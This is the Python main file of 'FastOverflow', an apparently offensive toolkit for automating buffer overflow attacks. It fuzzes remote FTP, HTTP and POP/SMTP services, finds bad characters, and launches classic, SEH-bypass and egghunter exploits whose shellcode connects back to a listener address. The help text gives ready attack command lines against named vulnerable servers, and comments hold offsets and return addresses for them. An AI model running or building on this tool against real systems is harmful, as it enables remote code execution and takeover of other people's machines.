#!/usr/bin/python3
# import os
# import shutil
# import sys
# import socket
#
# import getopt
# from struct import *
# import subprocess
# import re
# import binascii
from time import sleep

from buffers.egghunter import EggHunter
from buffers.seh import Seh
from protocols.ftp import *

from buffers.classic import *
from utils.system import *
from utils.config import *

# ./fastoverflow -h 172.16.18.141 -p 21 -f user -m http -lhost 192.168.100.2 -lport 7777 -platform windows

class FastOverflow:

    def __init__(self, config):
        self.config = config

    def menu(self):
        print(" ")
        print("-" * 100)

        if (self.config.mode != "file"):
            print("[1] Fuzzer")

        print("[2] Classic Buffer Overflow")
        print("[3] EggHunter Buffer Overflow")
        print("[4] ByPass SEH Buffer Overflow")
        print("[5] Test Multiple Fields")

        if (self.config.mode != "file"):
            print("[6] Search BadChars")

        print("[9] Show Exploit Session")
        print("[0] Exit")

        process = System.input("Select one above :")

        if (process == "1"):
            self.generic_fuzzer()
        if (process == "2"):
            self.classical_overflow()
        elif (process == "3"):
            self.egghunter_overflow()
        elif (process == "4"):
            self.seh_overflow()
        elif (process == "5"):
            print(self.fuzz_fields())
        elif (process == "6"):
            self.search_badchars()
        elif (process == "9"):
            System.show_session(self.config)
            self.menu()
        elif (process == "0"):
            sys.exit(0)

    ############################
    ## SEARCHING FOR BADCHARS

    def test_badchars(self):

        bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas: ")

        if ',' in bads:
            _bads = bads.split(',')
            for _badchar in _bads:
                System.badchars.append(r'\x'+_badchar)
        elif bads != "":
            System.badchars.append(r'\x'+bads)

        print("We have bad chars:\n" + ', '.join(System.badchars))

    def search_badchars(self):

        adapter = System.get_adapter(self.config)
        inject_func = getattr(adapter, 'inject')

        for x in System.bads_to_test:
            buffer = x
            buffer += '\r\n'

            try:
                responses = inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)

                print(responses)
                for response in responses:
                    if "Illegal" in response:
                        System.badchars.append(r'\x{:x}'.format(ord(x)))
                        print(response + ' -- CHARACTER: ' + hex(ord(x)))

            except socket.error as error:
                print(error)

        print("Found the following bad chars:\n" + ', '.join(System.badchars))
        print("=" * 100)
        print("")
        self.menu()

    def fuzz_fields(self):
        adapter = self.get_adapter(self.config)
        inject_func = getattr(adapter, 'inject')

        for field in self.config.field.split(","):
            print("-" * 100)
            print("[!] Sending 10000 A's on " + field)
            # Todo: review full fuzzing
            overflow = inject_func(self.config.remoteip, self.config.remoteport, self.config.field, "A" * 10000, True)
            print("[*] Waiting 3 seconds... ")
            sleep(3)

    def generic_fuzzer(self):

        System.generic_fuzzer(self.config)
        self.menu()

    ############################
    # OVERFLOW PROCESSES

    def classical_overflow(self):

        classical_buffer = Classic(self.config)
        classical_buffer.exploit()

    def egghunter_overflow(self):

        classical_buffer = EggHunter(self.config)
        classical_buffer.exploit()

    def seh_overflow(self):

        process = Seh(self.config)
        process.exploit()

def help():
    print("=" * 100 + "\r\n")
    print("Usage: fast_overflow.py -m [MODE] [-o PLATFORM] [-h HOST] [-p PORT] [-f FIELD] [-U USER] [-P PASS] [-i LOCALIP] [-l LOCALPORT] ")
    print("")
    print(" -m, --mode=MODE           Specify mode for buffer overflow. Accepted : ftp | http | popsmtp | file")
    print(" -o, --os=PLATFORM         Target OS Platform for shellcode. Accepted: windows | unix | linux | mac")
    print(" -h, --host=HOST           Target to attack. Not used in FILE mode")
    print(" -p, --port=PORT           Port to attack. Not used in FILE mode")
    print(" -f, --fields=FIELD        Set fields to exploit: user, pass, stor, cookie, user-agent. Separate multiple by commas")
    print(" -v, --http-verb=HTTPVERB  Set HTTP method to exploit: GET, HEAD, POST, TRACE, etc. Default: HEAD")
    print(" -u, --http-uri=HTTPURI    Set HTTP uri to exploit. Default: /") # Todo: set uri argument
    print(" -i, --lip=LOCALIP         Local IP for shellcode")
    print(" -l, --lport=LOCALPORT     Local Port for shellcode")
    print(" -U, --auth-user=USER      User for auth. Default: user")
    print(" -P, --auth-pass=PASS      Pass for auth. Default: user")
    print("")
    print("=" * 100)
    print("")
    print("Samples: \n\r\n\r"
          "WarFTPd             ./fast_overflow.py -h 172.16.18.128 -p 21 -f user -m ftp -o windows\r\n" # : 485, 32714131, 7c941eed, 16 NOPs"
          "Ability FTP Server  ./fast_overflow.py -h 172.16.18.128 -p 21 -f stor -m ftp -o windows -U ftp -P ftp\r\n" # : 968, 33674232, 77fab127, 32 NOPs\n\r"
          "SLMail              ./fast_overflow.py -h 172.16.18.128 -p 110 -m popsmtp -o windows -f pass\r\n" # : 2606, 7608BCCF, 77fab127, 16 NOPs\n\r")
          "Video Players       ./fast_overflow.py -m file -o windows -i 172.16.18.1 -l 7777\r\n"
          "Konica Minolta      ./fast_overflow.py -h 172.16.18.138 -p 21 -o windows -m ftp -f cwd\r\n" # SEH : 1037, 1220401E, 8 NOPs\n\r"
          "Kolibri             ./fast_overflow.py -h 172.16.18.128 -p 8080 -o windows -m http -f uri -v head\r\n" # EggHunting : 515, 32724131, 7CA58265, 011EFB28, 011EFAF4, 8 NOPs\n\r"# )
           );

    sys.exit(1)


def main(args):

    # columns, rows = shutil.get_terminal_size((80, 20))
    print("")
    print("#" * 100)
    print("")
    print("# FastOverflow v1.0-rc - A toolkit for automating Buffer Overflow process")
    print("# Currently supporting Vanilla, SEH Bypass, EggHunter through HTTP, FTP, POP, SMTP and File")
    print("")
    print("# By Daniel (daniel@zillius.com.br) ")
    print("")
    print("#" * 100)

    _c = Config()

    short_options = "h:p:f:m:o:i:l:v:U:P:"
    long_options = ["host=", "port=", "field=", "mode=", "os=", "lip=", "lport=", "httpverb=", "user=", "passwd="]
    _args, values = getopt.getopt(args, short_options, long_options)

    print("")
    # print(_args)
    # Evaluate given options
    for current_arg, current_value in _args:
        if current_arg in ("-U", "user"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.user = (current_value)

        if current_arg in ("-P"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.passwd = (current_value)

        if current_arg in ("-h", "--host"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.remoteip = (current_value)

        if current_arg in ("-p", "--port"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.remoteport = int(current_value)

        if current_arg in ("-o", "--os"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.platform = (current_value)

        if current_arg in ("-i", "--lip"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.localip = (current_value)

        if current_arg in ("-l", "--lport"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.localport = int(current_value)

        if current_arg in ("-f", "--field"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.field = (current_value)

        if current_arg in ("-v", "--httpverb"):
            print (("[+] Set " + current_arg + ": %s") % current_value)
            _c.http_method = (current_value.upper())

        if current_arg in ("-m", "--mode"):
            # print (("[+] Selected Mode: %s") % current_value)

            if (current_value != "ftp" and current_value != "popsmtp" and current_value != "http" and current_value != "file"):
                help()
            else:
                _c.mode = (current_value)

        if ("--help") in current_arg:
            help()

    System.load_session(_c)

    if(_c.mode == "" or _c.mode == None):
        print("[!] Missing Mode!!! \r\n")
        help()

    # sys.exit(0);

    try:
        _f = FastOverflow(_c)
        _f.menu()

    except KeyboardInterrupt:
        save = System.input("[?] Do you want to save your progress data? [Y]es/[n]o")
        if save == "Y":
            System.save_session(_c)

        # _f.menu()
        # clear()
        sys.exit(1)


if __name__ == "__main__":
    main(sys.argv[1:])


